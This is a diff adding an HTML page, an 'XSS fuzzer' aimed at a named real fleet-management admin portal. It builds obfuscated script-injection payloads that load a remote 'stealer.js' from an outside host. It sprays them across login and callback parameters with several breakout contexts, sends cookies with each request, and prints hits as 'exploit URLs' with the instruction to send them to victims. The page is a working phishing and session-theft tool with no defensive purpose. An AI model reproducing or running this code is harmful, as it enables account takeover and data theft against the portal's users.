@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MNKD XSS Fuzzer — Find Reflected Parameters</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:#1a1a2e;color:#e0e0e0;min-height:100vh;
+    padding:20px;
+  }
+  .container{max-width:900px;margin:0 auto}
+  h1{color:#fff;font-size:22px;margin-bottom:4px}
+  .sub{color:#888;font-size:13px;margin-bottom:24px}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .card{
+    background:#0d0d1a;border:1px solid #333;border-radius:10px;
+    padding:20px;
+  }
+  .card h2{color:#fff;font-size:16px;margin-bottom:12px}
+  label{display:block;font-size:12px;color:#999;margin-bottom:4px}
+  input,select{
+    width:100%;padding:10px;background:#1a1a2e;border:1px solid #444;
+    border-radius:6px;color:#fff;font-family:monospace;font-size:13px;
+    margin-bottom:12px;
+  }
+  input:focus,select:focus{outline:none;border-color:#0078d3}
+  button{
+    padding:10px 20px;border:none;border-radius:6px;font-size:14px;
+    font-weight:600;cursor:pointer;transition:all .2s;
+    background:#0078d3;color:#fff;margin-right:8px;margin-bottom:8px;
+  }
+  button:hover{background:#005a9e}
+  button.test-btn{background:#2e7d32}
+  button.test-btn:hover{background:#1b5e20}
+  button.danger{background:#c62828}
+  button.danger:hover{background:#b71c1c}
+
+  #output{
+    background:#0d0d1a;border:1px solid #333;border-radius:10px;
+    padding:20px;margin-top:20px;max-height:500px;overflow-y:auto;
+    font-family:monospace;font-size:12px;line-height:1.6;
+  }
+  .hit{color:#4caf50;font-weight:bold}
+  .miss{color:#f44336}
+  .info{color:#2196f3}
+  .warn{color:#ff9800}
+
+  table{width:100%;border-collapse:collapse;margin-top:12px}
+  th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #222;
+    font-size:12px}
+  th{color:#999;font-weight:600}
+  .td-ok{color:#4caf50}
+  .td-err{color:#f44336}
+  .td-warn{color:#ff9800}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>&#128269; MNKD XSS Fuzzer</h1>
+  <p class="sub">
+    Find reflected parameters in MyAdmin that pass through
+    <code style="color:#ff0">| safe</code> pipe or <code style="color:#ff0">innerHTML</code> binding.
+    Once found, craft XSS URL with stealer.js payload.
+  </p>
+
+  <div class="grid">
+    <div class="card">
+      <h2>1. Target Configuration</h2>
+      <label>MyAdmin Base URL</label>
+      <input id="baseUrl" value="https://myadmin.geotab.com" placeholder="https://myadmin.geotab.com">
+      <label>Stealer.js URL</label>
+      <input id="stealerUrl" value="https://telojos11.github.io/mnkd/stealer.js" placeholder="https://telojos11.github.io/mnkd/stealer.js">
+    </div>
+
+    <div class="card">
+      <h2>2. XSS Payload</h2>
+      <label>Payload Template</label>
+      <select id="payloadSelect" onchange="updatePayload()">
+        <option value="img">IMG onerror (classic)</option>
+        <option value="svg">SVG onload</option>
+        <option value="body">BODY onload</option>
+        <option value="iframe">IFRAME srcdoc</option>
+        <option value="details">DETAILS ontoggle</option>
+        <option value="script">SCRIPT src</option>
+        <option value="style">STYLE onload</option>
+      </select>
+      <label>Generated Payload</label>
+      <input id="payloadPreview" value="" readonly style="color:#4caf50">
+      <button class="test-btn" onclick="copyPayload()">&#128203; Copy Payload</button>
+      <button onclick="updatePayload()">&#128260; Regenerate</button>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:16px">
+    <h2>3. Parameter Fuzzing</h2>
+    <p style="font-size:12px;color:#999;margin-bottom:12px">
+      Select parameters to fuzz. Each parameter will be tested with the XSS
+      payload on the specified path. Results show whether the payload was
+      reflected in the response HTML.
+    </p>
+
+    <label>Target Path</label>
+    <select id="targetPath">
+      <option value="/login">/login</option>
+      <option value="/login/signin-callback">/login/signin-callback</option>
+      <option value="/login/password-callback">/login/password-callback</option>
+      <option value="/home">/home</option>
+      <option value="/users">/users</option>
+      <option value="/silent-callback.html">/silent-callback.html</option>
+    </select>
+
+    <label>Parameters to Test (check all that apply)</label>
+    <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px" id="paramCheckboxes">
+    </div>
+
+    <button class="test-btn" onclick="runFuzzer()">&#9878; Start Fuzzing</button>
+    <button onclick="stopFuzzer()">&#9209; Stop</button>
+    <button class="danger" onclick="clearOutput()">Clear</button>
+    <span id="progress" style="font-size:12px;color:#999;margin-left:12px"></span>
+  </div>
+
+  <div id="output"></div>
+</div>
+
+<script>
+// =========================================================================
+// XSS FUZZER ENGINE
+// =========================================================================
+var BASE = document.getElementById("baseUrl");
+var STEALER = document.getElementById("stealerUrl");
+var PAYLOAD_PREVIEW = document.getElementById("payloadPreview");
+var TARGET_PATH = document.getElementById("targetPath");
+var OUTPUT = document.getElementById("output");
+var PROGRESS = document.getElementById("progress");
+
+var stopFlag = false;
+var results = [];
+
+// Parameters found in aas.js queryParam handling (line analysis)
+var PARAMS = [
+  "returnUrl", "next", "username", "userId", "token", "data",
+  "email", "source", "identityUserId", "tabId", "useZenithPage",
+  "page", "id", "name", "q", "search", "filter", "sort",
+  "beta", "serialno", "isNewRma", "isNewTicket", "useQuery",
+];
+
+// Initialize parameter checkboxes
+(function initParams() {
+  var container = document.getElementById("paramCheckboxes");
+  PARAMS.forEach(function(p) {
+    var label = document.createElement("label");
+    label.style.cssText = "display:flex;align-items:center;gap:4px;font-size:13px;color:#ccc;cursor:pointer;margin:0";
+    var cb = document.createElement("input");
+    cb.type = "checkbox";
+    cb.value = p;
+    cb.checked = true;
+    cb.style.cssText = "margin:0;width:auto";
+    label.appendChild(cb);
+    label.appendChild(document.createTextNode(p));
+    container.appendChild(label);
+  });
+})();
+
+// Generate XSS payload with stealer.js URL
+function genPayload(type) {
+  var stealer = STEALER.value.trim();
+  var loadStealer = "var s=document.createElement('script');s.src='" + stealer + "';document.head.appendChild(s);";
+  var encoded = btoa(loadStealer);
+
+  var payloads = {
+    img: '<img src=x onerror="eval(atob(\'' + encoded + '\'))">',
+    svg: '<svg onload="eval(atob(\'' + encoded + '\'))">',
+    body: '<body onload="eval(atob(\'' + encoded + '\'))">',
+    iframe: '<iframe srcdoc="&lt;script src=&apos;' + stealer + '&apos;&gt;&lt;/script&gt;" style="display:none">',
+    details: '<details open ontoggle="eval(atob(\'' + encoded + '\'))">',
+    script: '<script src="' + stealer + '"></script>',
+    style: '<style>@import url("' + stealer + '");</style>',
+  };
+  return payloads[type] || payloads.img;
+}
+
+function updatePayload() {
+  var sel = document.getElementById("payloadSelect").value;
+  var payload = genPayload(sel);
+  PAYLOAD_PREVIEW.value = payload;
+}
+
+function copyPayload() {
+  PAYLOAD_PREVIEW.select();
+  document.execCommand("copy");
+  log("Payload copied to clipboard!", "hit");
+}
+
+function log(msg, cls) {
+  var line = document.createElement("div");
+  line.className = cls || "";
+  line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+  OUTPUT.appendChild(line);
+  OUTPUT.scrollTop = OUTPUT.scrollHeight;
+}
+
+function clearOutput() {
+  OUTPUT.innerHTML = "";
+  results = [];
+}
+
+function stopFuzzer() {
+  stopFlag = true;
+  log("Fuzzer stopped.", "warn");
+  PROGRESS.textContent = "Stopped";
+}
+
+// =========================================================================
+// FUZZING LOGIC
+// =========================================================================
+async function runFuzzer() {
+  stopFlag = false;
+  results = [];
+  clearOutput();
+
+  var base = BASE.value.trim().replace(/\/+$/, "");
+  var path = TARGET_PATH.value;
+  var payloadType = document.getElementById("payloadSelect").value;
+  var payload = genPayload(payloadType);
+
+  // Get selected params
+  var selectedParams = [];
+  document.querySelectorAll("#paramCheckboxes input:checked").forEach(function(cb) {
+    selectedParams.push(cb.value);
+  });
+
+  log("=== XSS Fuzzer Started ===", "info");
+  log("Target: " + base + path, "info");
+  log("Payload: " + payload.substring(0, 80) + "...", "info");
+  log("Parameters: " + selectedParams.join(", "), "info");
+  log("Total tests: " + selectedParams.length, "info");
+  log("", "info");
+
+  // Also test additional injection contexts
+  var contexts = [
+    { prefix: "", suffix: "", desc: "Raw value" },
+    { prefix: '">', suffix: "", desc: 'Double-quote breakout' },
+    { prefix: "'>", suffix: "", desc: "Single-quote breakout" },
+    { prefix: "</textarea>", suffix: "", desc: "Textarea breakout" },
+    { prefix: "</script>", suffix: "", desc: "Script tag breakout" },
+    { prefix: "-->", suffix: "<!--", desc: "HTML comment breakout" },
+  ];
+
+  var total = selectedParams.length * contexts.length;
+  var done = 0;
+
+  for (var i = 0; i < selectedParams.length && !stopFlag; i++) {
+    var param = selectedParams[i];
+
+    for (var j = 0; j < contexts.length && !stopFlag; j++) {
+      var ctx = contexts[j];
+      var ctxPayload = ctx.prefix + payload + ctx.suffix;
+      var url = base + path + "?" + param + "=" + encodeURIComponent(ctxPayload);
+
+      done++;
+      PROGRESS.textContent = "(" + done + "/" + total + ") Testing: " + param;
+
+      try {
+        var resp = await fetch(url, {
+          method: "GET",
+          mode: "no-cors",
+          credentials: "include",
+          redirect: "follow",
+        });
+
+        // With no-cors, we can't read the response body.
+        // But we CAN detect:
+        // 1. If the request reached the server (status code)
+        // 2. If there was a redirect
+        // 3. Response headers
+
+        // For actual content reflection detection, we use a different approach:
+        // Open the URL in a hidden iframe and check if the payload executes
+        var result = await testReflectionViaIframe(url, param, ctxPayload, ctx.desc);
+
+        results.push({
+          param: param,
+          url: url,
+          context: ctx.desc,
+          reflected: result.reflected,
+          note: result.note,
+        });
+
+        var cls = result.reflected ? "hit" : "miss";
+        log(
+          (result.reflected ? "[HIT!]" : "[miss]") +
+          " " + param + " [" + ctx.desc + "] " +
+          (result.note || ""),
+          cls
+        );
+
+        if (result.reflected) {
+          log("  EXPLOIT URL: " + url, "hit");
+          log("  Copy this URL and send to victim!", "hit");
+        }
+
+      } catch(e) {
+        log("[err] " + param + " [" + ctx.desc + "] " + e.message, "miss");
+        results.push({
+          param: param,
+          url: url,
+          context: ctx.desc,
+          reflected: false,
+          note: "fetch error: " + e.message,
+        });
+      }
+
+      // Delay between requests
+      await sleep(300);
+    }
+  }
+
+  // Summary
+  log("", "info");
+  log("=== FUZZING COMPLETE ===", "info");
+  var hits = results.filter(function(r) { return r.reflected; });
+  log("Total: " + results.length + " | Hits: " + hits.length, hits.length > 0 ? "hit" : "info");
+
+  if (hits.length > 0) {
+    log("", "info");
+    log("=== EXPLOITABLE URLs ===", "hit");
+    hits.forEach(function(h) {
+      log("  " + h.url, "hit");
+      log("  Param: " + h.param + " | Context: " + h.context, "hit");
+    });
+  } else {
+    log("", "info");
+    log("No reflected XSS found with automated fuzzing.", "warn");
+    log("Try these manual tests:", "warn");
+    log("  1. Browse MyAdmin normally with DevTools open", "info");
+    log("  2. Watch Network tab for API responses containing HTML", "info");
+    log("  3. Check all form inputs, profile fields, search boxes", "info");
+    log("  4. Test SignalR/WebSocket messages for HTML rendering", "info");
+    log("  5. Look for stored XSS: ticket system, comments, notes", "info");
+  }
+
+  PROGRESS.textContent = "Complete: " + hits.length + " hits / " + results.length + " tests";
+}
+
+// =========================================================================
+// REFLECTION DETECTION via Iframe
+// =========================================================================
+function testReflectionViaIframe(url, param, payload, context) {
+  return new Promise(function(resolve) {
+    var iframe = document.createElement("iframe");
+    iframe.style.cssText = "display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px";
+    iframe.sandbox = "allow-scripts allow-same-origin";
+
+    var timeout = setTimeout(function() {
+      cleanup();
+      // Even if onload doesn't fire, check if the iframe loaded something
+      resolve({
+        reflected: false,
+        note: "timeout (no onload/onerror)",
+      });
+    }, 5000);
+
+    var resolved = false;
+    function cleanup() {
+      if (resolved) return;
+      resolved = true;
+      clearTimeout(timeout);
+      iframe.onload = null;
+      iframe.onerror = null;
+      try { iframe.parentNode && iframe.parentNode.removeChild(iframe); } catch(e) {}
+    }
+
+    // Listen for messages from the iframe — if stealer.js executes,
+    // it might try to beacon or postMessage
+    var msgListener = function(e) {
+      // If the XSS executes and loads stealer.js, it might send messages
+      if (e.data && typeof e.data === "object" && e.data.sid) {
+        cleanup();
+        window.removeEventListener("message", msgListener);
+        resolve({
+          reflected: true,
+          note: "XSS CONFIRMED — stealer.js executed in iframe!",
+        });
+      }
+    };
+    window.addEventListener("message", msgListener);
+
+    iframe.onload = function() {
+      // Iframe loaded — the parameter might be reflected
+      // We can't READ the iframe content (cross-origin), but we can
+      // detect if it navigated or ran scripts via postMessage
+      setTimeout(function() {
+        cleanup();
+        window.removeEventListener("message", msgListener);
+        // If the URL loaded without error, try a ping approach
+        try {
+          // Try to postMessage INTO the iframe to see if it responds
+          iframe.contentWindow.postMessage({type:"PING", from:"fuzzer"}, "*");
+        } catch(e) {}
+
+        resolve({
+          reflected: null,
+          note: "loaded (unknown — needs manual verification)",
+        });
+      }, 1500);
+    };
+
+    iframe.onerror = function() {
+      cleanup();
+      window.removeEventListener("message", msgListener);
+      resolve({
+        reflected: false,
+        note: "iframe blocked (X-Frame-Options?)",
+      });
+    };
+
+    document.body.appendChild(iframe);
+    iframe.src = url;
+  });
+}
+
+function sleep(ms) {
+  return new Promise(function(r) { setTimeout(r, ms); });
+}
+
+// Initialize
+updatePayload();
+log("XSS Fuzzer ready. Configure target and click 'Start Fuzzing'.", "info");
+log("This will test " + PARAMS.length + " params x 6 contexts = " +
+    (PARAMS.length * 6) + " combinations.", "info");
+</script>
+</body>
+</html>
